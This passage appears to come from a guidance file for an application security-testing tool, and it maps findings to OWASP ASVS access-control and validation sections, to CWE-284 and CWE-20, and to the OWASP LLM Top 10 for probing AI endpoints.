- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

